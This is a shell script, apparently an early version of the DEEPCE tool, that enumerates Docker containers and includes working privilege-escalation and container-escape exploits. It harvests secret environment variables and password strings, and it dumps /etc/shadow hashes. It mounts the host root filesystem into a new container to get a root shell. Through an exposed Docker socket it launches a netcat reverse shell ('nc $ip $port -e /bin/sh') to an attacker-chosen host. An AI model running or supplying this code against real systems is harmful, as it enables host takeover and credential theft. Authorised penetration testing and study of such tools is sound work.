#!/bin/sh

VERSION="v0.1.0"
ADVISORY="deepce should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission."

########################################### 
#---------------) Colors (----------------#
###########################################

C=$(printf '\033')
RED="${C}[1;31m"
GREEN="${C}[1;32m"
Y="${C}[1;33m"
B="${C}[1;34m"
LG="${C}[1;37m" #LightGray
DG="${C}[1;90m" #DarkGray
NC="${C}[0m"
UNDERLINED="${C}[5m"
EX="${C}[48;5;1m"

show_help() {
cat << EOF
Usage: ${0##*/} [OPTIONS...]

  -ne,--no-enum          Don't perform enumeration, useful for skipping straight to exploits
  
  $DG[Exploits]$NC
  -e, --exploit          Use one of the following exploits (eg. -e SOCK)
  
    DOCKER - use docker command to create new contains and mount root partition to priv esc
    SOCK - use an exposed docker sock to create a new container and mount root partition to priv esc
    CVE-2019-5746
    CVE-2019-5021
    
  $DG[Payloads Options]$NC
  -i, --ip               The local host IP address for reverse shells to connect to
  -p, --port             The port to use for bind or reverse shells
  -l, --listen           Automatically create the reverse shell listener
  
  -s, --shadow           Print the shadow file as the payload  
  -cmd, --command        Run a custom command as the payload
  -x, --payload          Run a custom executable as the payload
  
  --user                 Create a new root user
  --password             Password for new root user
  
  $DG[General Options]$NC
  -q, --quiet            Shhhh, be less verbose
  -h, --help             Display this help and exit.
  
  [Examples]
  $DG# Exploit docker to get a local shell as root$NC
  ./deepce.sh -e DOCKER
  
  $DG# Exploit an exposed docker sock to get a reverse shell as root on the host$NC
  ./deepce.sh -e SOCK -l -i 192.168.0.23 -p 4444 
    
EOF
}

########################################### 
#--------------) Variables (--------------#
###########################################

GREP_SECRETS="pass\|secret\|key"
GREP_SOCK_INFOS="Architecture\|OSType\|Name\|DockerRootDir\|NCPU\|OperatingSystem\|KernelVersion\|ServerVersion"
GREP_SOCK_INFOS_IGNORE="IndexConfig"
GREP_IGNORE_MOUNTS="/ /\|/cgroup\|/var/lib/docker/\|/null \| proc proc \|/dev/console\|docker.sock"

TIP_WRITABLE_SOCK="The docker sock is writable, we should be able to enumerate docker, create containers and obtain root privs on the host machine"
TIP_DNS_CONTAINER_NAME="Reverse DNS lookup of container name requires host, dig or nslookup to get the container name"
TIP_DOCKER_GROUP="Users in the docker group can escalte to root on the host by mounting the host partition inside the container and chrooting into it.\ndeepce.sh -e DOCKER"
TIP_DOCKER_CMD="If we have permission to create new docker containers we can mount the host's root partition and chroot into it and execute commands on the host OS."

TIP_CVE_2019_5021="Alpine linux version 3.3-3.5 accidentally allow users to login as root with a blank password, if we have command execution in the container we can become root using su root"
TIP_CVE_2019_13139="Docker versions before 18.09.4 are vulnerable to a command execution vulernability when parsing URLs"
TIP_CVE_2019_5736="Docker versions before 18.09.2 are vulnearble to a container escape by overwriting the runC binary"

USEFUL_CMDS="curl wget gcc nc netcat ncat jq nslookup host hostname dig python python2 python3 nmap"

########################################### 
#---------------) Helpers (---------------#
###########################################

# Convert version numbers into a regular number so we can do simple comparisons.
function ver { printf "%03d%03d%03d" $(echo "$1" | tr '.' ' '); }

########################################### 
#--------------) Printing (---------------#
###########################################

nl(){
echo ""
}

printer(){
  # Only print if not empty
  if [ "$2" ] ; then
    # Temporarily replace the IFS with null to preserve newline chars
    OLDIFS=$IFS
    IFS=  
    printf "$1$2$NC\n"
    # Restore it so we don't break anything else
    IFS=$OLDIFS
  fi
}

printEx(){
  printer "$EX" "$1"
}
printSuccess(){
  printer "$Y" "$1"
}
printFail(){
  printer "$DG" "$1"
}
printError(){
  printer "$RED" "$1"
}
printInfo(){
  printer "$LG" "$1"
}
printStatus(){
  printer "$DG" "$1"
}

printQuestion(){
    printf "$Y[+]$GREEN $1 $NC"
}

printYesEx(){
  printEx Yes
}

printYes(){
  printSuccess Yes
}

printNo(){
  printFail No
}

TODO(){
  printError "TODO"
}

printTip(){
  if [ "$quiet" ] ; then
    return
  fi
  printer "$DG" "$1" | fold -s -w 95
  nl
}

printMsg(){
  printQuestion "$1"
  printFail "$2"
}

printInstallAdvice(){
  printError "$1 is required but not installed"
  # TODO: Test install options
  # TODO: Rename some with correct package names  
  if [ -x "$(command -v apt)" ]; then
    # Debian based OSes
    # TODO dig / nslookup / host -> dnsutils
    printError "apt install -y $1"
  elif [ -x "$(command -v apk)" ]; then
    # Alpine
    # TODO: dig / nslookup -> bind-utils
    printError "apk add $1"
  elif [ -x "$(command -v yum)" ]; then
    # CentOS / Fedora
    # TODO: dig / nslookup -> bind-utils
    printError "yum install $1"
  elif [ -x "$(command -v apt-get)" ]; then
    # Old Debian
    # TODO dig / nslookup / host -> dnsutils
    printError "apt-get install -y $1"
  fi
  nl
}

banner(){
  if [ "$quiet" ] ; then
    return
  fi

cat << EOF
$DG                      ##$LG         .
$DG                ## ## ##$LG        ==
$DG             ## ## ## ##$LG       ===
$LG         /"""""""""""""""""\___/ ===
$B    ~~~ $DG{$B~~ ~~~~ ~~~ ~~~~ ~~~ ~$DG /  $LG===-$B ~~~$NC
$DG         \______ X           __/
$DG           \    \         __/
$DG            \____\_______/$NC
          __                        
     ____/ /__  ___  ____  ________ 
    / __  / _ \/ _ \/ __ \/ ___/ _ \ $DG  ENUMERATE$NC
   / /_/ /  __/  __/ /_/ / (__/  __/ $DG ESCALATE$NC
   \__,_/\___/\___/ .___/\___/\___/$DG  ESCAPE$NC
                 /_/

 Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
 by stealthcopter
  
EOF
}

########################################### 
#---------------) Checks (----------------#
###########################################

dockerCheck(){
  # Are we inside docker?
  dockerContainer=""
  if [ -f "/.dockerenv" ]; then
    dockerContainer="1"
  fi
  # TODO: Add additional checks
}

dockerSockCheck(){
  # Is the docker sock exposed
  printQuestion "Docker Sock ............."
  dockerSockPath=""
  if [ -S "/var/run/docker.sock" ]; then
    dockerSockPath="/var/run/docker.sock"
    printYes
    
    # TODO: Search elsewhere for sock?
    
    if [ "$dockerSockPath" ] ; then    
    
        printInfo "$(ls -lah $dockerSockPath)"
        nl
        
        # Is docker sock writable
        printQuestion "Sock is writable ......."
        if test -r "$dockerSockPath";
        then
          printYesEx
          printTip "$TIP_WRITABLE_SOCK"
        else
          printNo
        fi
        
        if [ -x "$(command -v curl)" ]; then
          sockInfoCmd="curl -s --unix-socket $dockerSockPath http://localhost/info "
          sockInfoRepsonse=`$sockInfoCmd`
          
          printTip "To see full info from the docker sock output run the following"
          printStatus "$sockInfoCmd"
          nl
          
          # Docker version unknown lets get it from the sock
          if [ -z "$dockerVersion" ]; then 
              # IF jq...
              #dockerVersion=`$sockInfoCmd | jq -r '.ServerVersion'`
              dockerVersion=`echo $sockInfoRepsonse  | tr ',' '\n' | grep "ServerVersion" | cut -d'"' -f 4`
          fi
          
          # Get info from sock
          info=`echo $sockInfoRepsonse | tr ',' '\n' | grep "$GREP_SOCK_INFOS" | grep -v "$GREP_SOCK_INFOS_IGNORE" | tr -d '"'`
          
          printInfo "$info"
        else
          printError "Could not interact with the docker sock, as curl is not installed"
          printInstallAdvice "curl"
        fi
    fi

  else
    printNo
  fi

}

containerID(){
  printf "$B==================================( "$GREEN"Enumerating Container"$B" )===================================$NC\n"
  # Get container ID
  containerID=`cat /etc/hostname`
  containerID=`hostname`
  containerID=`uname -n`
  # Get container full ID
  containerFullID=`basename $(cat /proc/1/cpuset)`
  printQuestion "Container ID ............"
  printSuccess $containerID
  printQuestion "Container Full ID ......."
  printSuccess $containerFullID
}

containerIP(){
  # TODO: Add ifconfig method?
  
  # Get container IP
  if [ -x "$(command -v hostname)" ]; then
    containerIP=`hostname -I 2>/dev/null || hostname -i`
  elif [ -x "$(command -v ip)" ]; then
    containerIP=`ip route get 1 | head -1 | cut -d' ' -f7` # FIXME: Use sed as fields are inconsistent
  fi
  
  printQuestion "Container IP ............"
  if [ "$containerIP" ] ; then
    printSuccess $containerIP
  else
    printError "Could not find IP"
  fi
  
  # Container DNS
  printQuestion "DNS Server(s) ..........."
  dnsServers=`cat /etc/resolv.conf | grep nameserver | cut -d' ' -f2 | tr '\n' ' '`
  if [ "$dnsServers" ] ; then
    printSuccess "$dnsServers"
  else
    printError "Could not find DNS Servers"
  fi
  
  # Host IP
  if [ -x "$(command -v netsxtat)" ]; then
    hostIP=`netstat -nr | grep '^0\.0\.0\.0' | awk '{print $2}'`
  elif [ -x "$(command -v ip)" ]; then
    if [ "$containerIP" ] ; then
      hostIP="$(echo $containerIP| cut -d'.' -f 1-3).1"
    fi
  fi
  printQuestion "Host IP ................."
  if [ "$hostIP" ] ; then
    printSuccess $hostIP
  else
    printError "Could not find Host IP"
  fi
}

containerName(){
  # Get container name
  # host, dig, nslookup
  
  if [ -x "$(command -v hosxt)" ]; then
    containerName=`host $containerIP | rev | cut -d' ' -f1 | rev`
  elif [ -x "$(command -v dig)" ]; then
    containerName=`dig -x $containerIP +noall +answer | grep "PTR" |rev | cut -f1 | rev`
  elif [ -x "$(command -v nslookup)" ]; then
    containerName=`nslookup $containerIP 2>/dev/null | grep "name = " | rev | cut -d' ' -f1 | rev`
  fi
  
  printQuestion "Container Name .........."
  if [ "$containerName" ] ; then
    printSuccess "$containerName"
  else
    printError "Could not get container name"
    printTip "$TIP_DNS_CONTAINER_NAME"
    printInstallAdvice "host dig nslookup"
  fi
  
  # TODO: Not found, alphine doesn't look to work
}

getHostInformation(){
  # Enumerate container info
  printStatus "OS:     $(uname -o)"
  printStatus "Kernel: $(uname -r)"
  printStatus "Arch:   $(uname -m)"
  # CPU Info
  printStatus "CPU:   $(cat /proc/cpuinfo | grep 'model name' | head -n1 | cut -d':' -f2)"
  
  printQuestion "Useful tools installed"
  nl
  for CMD in ${USEFUL_CMDS}; do
      command -v "${CMD}";
  done
  
  # If we are on an alpine linux disto check for CVE–2019–5021
  if [ -f "/etc/alpine-release" ]; then
    alpineVersion=`cat /etc/alpine-release`
    printQuestion "Alpine Linux Version ......"
    printSuccess "$alpineVersion"
    printQuestion "CVE-2019-5021 Vulnerable .."
    
    case "$alpineVersion" in
        3.3*|3.4*|3.5*) 
        printYesEx
        printTip "$TIP_CVE_2019_5021"
        ;;
        *)  printNo ;;
    esac
  fi
  
}

enumerateContainers(){
  printf "$B=================================( "$GREEN"Enumerating Containers"$B" )===================================$NC\n"
  
  # TODO: Use http api
  
  # Find containers...  
  if [ "$dockerCommandX" ] ; then
    # Enumerate containers using docker
    # TODO: Use docker
    docker ps -a
  elif [ "$dockerSockPathX" ] ; then
    # Enumerate containers using sock
    # TODO: Use sock
    TODO
  else
    # Enumerate containers the hard way (network enumeration)
    subnet=`echo $containerIP | cut -d'.' -f1-3`
    
    if [ -x "$(command -v nmap)" ]; then
      # Method 1: nmap
      printQuestion "Attempting ping sweep of $subnet.0/24 (nmap)"
      nl
      nmap -oG - -sP $subnet.0/24 | grep "Host:"
    elif [ -x "$(command -v ping)" ]; then
      # Method 2: ping sweep
      printQuestion "Attempting ping sweep of $containerIP/24 (ping)"
      nl
      
      pids=""
      # Ping all IPs in range
      set +m
      for addr in `seq 1 1 10 `; do
        ( ping -c 1 -t 1 $subnet.$addr > /dev/null && echo $subnet.$addr is Up ) & > /dev/null 
        pids="${pids} $!"
      done
      
      # Wait for all background pids to complete
      for pid in ${pids}; do
        wait "${pid}";
      done
      
    fi
  fi
  
  # Scan containers / host
  
}

findMountedFolders(){
  printf "$B===================================( "$GREEN"Enumerating Mounts"$B" )=====================================$NC\n"
  # Find information about mount points
  # TODO: Better parsing
  
  printQuestion "Docker sock mounted ...."  
  if [ "$(grep docker.sock /proc/self/mountinfo)" ]; then
    printYesEx
    # Docker sock appears to be mounted, uhoh!
    printTip "$TIP_WRITABLE_SOCK" 
    dockerSockPath=`grep docker.sock /proc/self/mountinfo | cut -d' ' -f 5`
  else
    printNo
  fi
  
  otherMounts=`cat /proc/self/mountinfo  | grep -v "$GREP_IGNORE_MOUNTS" | cut -d' ' -f 4-`
  
  printQuestion "Other mounts ..........."
  if [ "$dockerContainer" ] ; then
    printYes
    printStatus "$otherMounts"
  else
    printNo
  fi
  
  nl
}

findInterestingFiles(){
  printf "$B====================================( "$GREEN"Interesting Files"$B" )=====================================$NC\n"

  
  interstingVars=`env | grep -i "$GREP_SECRETS"`
  boringVars=`env | grep -iv "$GREP_SECRETS"`
  
  printQuestion "Interesting environment variables ..."
  if [ "$interstingVars" ] ; then
    printYes
    printSuccess "$interstingVars"
  else
    printNo
  fi
  
  printStatus "$boringVars"
  
  # Any common entrypoint files etc?
  printQuestion "Any common entrypoint files ........."
  nl
  ls -lah /entrypoint.sh /deploy 2>/dev/null
  
  # Any files in root dir
  printQuestion "Interesting files in root ..........."
  nl
  find / -maxdepth 1 -type f | grep -v "/.dockerenv"
  nl
  
  # Any passwords root dir files
  # TODO: Look for other common places...
  result=`grep -Iins "$GREP_SECRETS" /*`
  printQuestion "Passwords in common files ..........."
  if [ "$result" ] ; then
    printYes
    printSuccess "$result"
  else
    printNo
  fi
  
  # Home Directories
  homeDirs=`ls -lAh /home`
  printQuestion "Home directories ...................."
  if [ "$(echo $homeDirs| grep -v 'total 0')" ] ; then
    printStatus "$homeDirs"
  else
    printNo
  fi
  
  hashes=`cat /etc/shadow | cut -d':' -f2 | grep -v '^*$\|^!'`
  printQuestion "Hashes in shadow file ..............."
  if [ "$hashes" ] ; then
    printYes
    printStatus "$hashes"
  else
    printNo
  fi
  
}

getDockerVersion(){
  printQuestion "Docker Executable ......."
  if [ "$(command -v docker)" ]; then
    dockerCommand=`command -v docker`
    dockerVersion=`docker -v | cut -d',' -f1 | cut -d' ' -f3`
    printSuccess "$dockerCommand"
    printQuestion "Docker version ........."
    printSuccess "$dockerVersion"
    
    printQuestion "User in Docker group ...."
    if groups | grep -q '\bdocker\b'; then
      printYesEx
      printTip "$TIP_DOCKER_GROUP"
    else
      printNo
    fi
  else
    printNo
  fi
}

checkDockerVersionExploits(){
  # Check version for known exploits
  printQuestion "Docker Exploits ........."
  
  if ! [ $dockerVersion ]; then
    printError "Version Unknown"
    return
  else
    printSuccess "$dockerVersion"
  fi
  
  printQuestion "CVE–2019–13139 .........."
  if [ $(ver $dockerVersion) -lt $(ver 18.9.5) ]; then
    printYesEx
    printTip "$TIP_CVE_2019_13139"
  else
    printNo
  fi
  
  printQuestion "CVE–2019–5736 ..........."
  if [ $(ver $dockerVersion) -lt $(ver 18.9.3) ]; then
    printYesEx
    printTip "$TIP_CVE_2019_5736"
  else
    printNo
  fi

}

########################################### 
#--------------) Exploits (---------------#
###########################################

exploitDocker(){
  printf "$B===================================( "$GREEN"Exploiting Docker"$B" )======================================$NC\n"
  printTip "$TIP_DOCKER_CMD"
  
  if ! [ -x "$(command -v docker)" ]; then
    printError "Docker command not found, but required for this exploit"
    exit
  fi
  
  # PAYLOADS
  # - shadow
  # - local shell
  #
  # - root user
  # - ssh keys
  # - custom command
  # - reverse tcp
  
  if [ "$shadow" ] ; then
    # Show shadow passwords
    printMsg "Exploit Type ............." "Print Shadow"
    printMsg "Clean up ................." "Automatic on container exit"
    cmd="cat /mnt/etc/shadow"
  elif [ "$rootUser" ] ; then
    # TODO: Allow new root user
    
    if ! [ "$username" ] ; then
      printError "username missing"
      exit 1
    fi
     
    if ! [ "$password" ] ; then
      printError "passsword missing"
      exit 1
    fi
        
    printMsg "Exploit Type ............." "Add new root user"
    printMsg "Username ................." "$username"
    printMsg "Password ................." "$password"
    printMsg "Clean up ................." "Automatic on container exit"
    TODO
  elif [ "$command" ] ; then
    printMsg "Exploit Type ............." "Custom Command"
    printMsg "Custom Command ..........." "$command"
    printMsg "Clean up ................." "Automatic on container exit"
    cmd="chroot /mnt $command"
  elif [ "$ip" ] ; then
    # TODO: Reverse shell

    if ! [ "$port" ] ; then
      printError "port missing"
      exit 1
    fi
    
    printMsg "Shell Type ....... " "Reverse TCP"
    printMsg "Create listener .. " "No"
    printMsg "Host ............. " "$ip"
    printMsg "Port ............. " "$port"
    cmd="/bin/sh -c nc $ip $port -e /bin/sh"    
  else
    printMsg "Exploit Type ............." "Local Shell"
    printMsg "Create shell ............." "Yes"
    printMsg "Clean up ................." "Automatic on container exit"
    cmd="chroot /mnt sh"
  fi
  
  printQuestion "Exploiting"
  nl
  docker run -v /:/mnt --rm -it alpine $cmd

  printQuestion "Exploit complete ...."
  if [ $? ]; then
    printSuccess "Success"
  else
    printError 'Error'
  fi
  
  # TODO: Add new user
}

exploitDockerSock(){
  printf "$B====================================( "$GREEN"Exploiting Sock"$B" )=======================================$NC\n"

  printTip "$TIP_DOCKER_SOCK"
  
  if ! [ -x "$(command -v curl)" ]; then
    printInstallAdvice "curl"
    exit
  fi
  
  if [ -S "$dockerSockPath" ]; then
    printError "Docker sock not found, but required for this exploit"
    exit
  fi
  
  if ! [ "$ip" ] ; then
    printError "ip missing"
    exit 1
  fi
  
  if ! [ "$port" ] ; then
    printError "port missing"
    exit 1
  fi
  
  cmd="nc $ip $port -e /bin/sh"
  
  printMsg "Shell Type ......." "Reverse TCP"
  printMsg "Create listener .." "No"
  printMsg "Host ............." "$ip"
  printMsg "Port ............." "$port"
  printMsg "Command .........." "$cmd"
  printMsg "Clean up ........." "Manual"
  
  if [ "$listen" ] ; then
    # Enable job control
    set -m
    # Create listener
    nc -lvnp $port &
    bg
  fi
  
  nl
  
  # Create docker container using the docker sockx
  payload="[\"/bin/sh\",\"-c\",\"$cmd\"]" #
  response=`curl -s -XPOST --unix-socket /var/run/docker.sock -d "{\"Image\":\"alpine\",\"cmd\":$payload, \"Binds\": [\"/:/mnt:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create`
  
  if ! [ $? ]; then
    printError 'Something went wrong'
    echo $response
    return
  fi
  
  revShellContainerID=`echo $response|cut -d'"' -f4`
  printQuestion "Creating container ....."
  printSuccess "$revShellContainerID"
    
  startCmd="curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/$revShellContainerID/start"
  deleteCmd="curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/$revShellContainerID/stop"
  removeCmd="curl -s -XDELETE --unix-socket /var/run/docker.sock http://localhost/containers/$revShellContainerID"
  
  printQuestion "If the shell dies, restart your listener and run this command to fire it again\n"
  printStatus "$startCmd"
  
  printQuestion "Once complete remember to tidy up by stopping and deleting your container with following commands\n"
  printStatus "$deleteCmd"
  printStatus "$removeCmd"
  
  # FIXME: Must be a better way of doing this...
  eval $startCmd
  
  printQuestion "Starting container ....."
  if [ $? ]; then
    printSuccess "Success"
    
    if [ "$listen" ] ; then
      # Create listener
      printMsg 'Exploit completed ......' 'Switching to listener'
      fg
    else
      printMsg 'Exploit completed ......' 'Check your listener'
    fi
    
    
  else
    printError 'Looks like something went wrong'
    echo $response
    return
  fi
  
  # TODO: Switch to listener if wanted
  # TODO: Tidy up command
}


########################################### 
#--------------) Arg Parse (--------------#
###########################################

while [ $# -gt 0 ]
do
  key="$1"
  case $key in
      -h|--help)
        show_help
        exit 0
        ;;
      -ne|--no-enumeration|--no-enum|--no-enumerate)
        skipEnum="1"
        shift
        ;;     
      -q|--quiet)
        quiet="1"
        shift
        ;;            
      -e|-ex|--exploit)
        exploit="$2"
        shift
        shift
        ;;      
      -l|--listen)
        listen="1"
        shift
        ;;
      --user)
        username="$2"
        shift
        shift
        ;;
      -cmd|--command)
        command="$2"
        shift
        shift
        ;;
      --pass)
        password="$2"
        shift
        shift
        ;;        
      -s|--shadow)
        shadow="1"
        shift
        ;;               
      -i|--ip)
        ip="$2"
        shift
        shift
        ;;
      -p|--port)
        port="$2"
        shift
        shift
        ;; 
      *)
        echo "Unknown option $1"
        exit 1
      ;;
  esac
done

echo $ip
echo $port

########################################### 
#--------------) Execution (--------------#
###########################################

banner

if ! [ "$skipEnum" ] ; then

  printf "$B===================================( "$GREEN"Enumerating Docker"$B" )=====================================$NC\n"
  dockerCheck

  printQuestion "Docker Container ........"

  if [ "$dockerContainer" ] ; then
    # Inside Docker Container
    printYes
    getDockerVersion
    dockerSockCheck
    checkDockerVersionExploits
    containerID
    containerIP
    containerName
    getHostInformation
    findMountedFolders
    findInterestingFiles
    enumerateContainers
  else
    # Outside Docker
    printNo
    getDockerVersion
    dockerSockCheck
    checkDockerVersionExploits
    enumerateContainers
  fi
fi

# Parse exploit argument
if [ "$exploit" ] ; then
  case $exploit in
      docker|DOCKER)
        exploitDocker
        ;;
      sock|SOCK)
        exploitDockerSock
        ;;      
      *)
        echo "Unknown exploit $1"
        exit 1
      ;;
  esac
fi

printf "$B==============================================================================================$NC\n"
  
exit 0

########################################### 
#--------------) POSTAMBLE (--------------#
###########################################  

# ENUM
#
# TODO Enumerate other docker containers (inter-container communication)
# TODO: What can we get from /proc/ # cat /proc/self/cgroup
# TODO: Node apps
# TODO: Python apps
# 
# PAYLOADS
#
# -x, --payload        The payload file to execute instead of creating a listener
# -s, --shadow         Exploit payload to print the contents of the shadow file
# -ru, --root-user     Add a new root user to /etc/passwd and /etc/shadow
# -tc, --turbo-charge  Automatically download additional tools and binaries needed (NOISY)
# 
# SSH Key
#
# CHECKS
# 
# Am I root
# Am I sudo
#
# EXPLOITS
# 
# TODO: CVE-2019-5746 (runc)
# TODO: CVE-2019-5021 (Alpine Linux Docker Image Credential Vulnerability)
# TODO: Container escapes
# TODO: Exploit docker over http
# Windows only docker exploits 
# CVE–2019–15752 
# CVE–2018–15514

# Docker sock api https://docs.docker.com/engine/api/v1.24/

# Recommend static binaries https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64
